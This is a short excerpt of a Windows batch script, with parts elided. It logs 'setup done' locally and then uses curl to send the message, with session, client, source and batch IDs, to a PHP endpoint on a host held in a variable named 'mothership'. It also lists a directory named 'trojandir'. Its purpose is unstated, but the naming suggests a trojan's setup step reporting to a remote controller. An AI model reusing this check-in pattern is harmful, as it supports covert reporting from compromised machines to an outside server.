...
set msg=setup done
echo %msg% >> %logfpath%
curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=%msg%" --data-urlencode "sessionid=%sessionid%" --data-urlencode "source=%source%" --data-urlencode "clientid=%clientid%" --data-urlencode "batchid=%batchid%"
...
dir /s %trojandir% > %workdir%\dir_s_final.txt
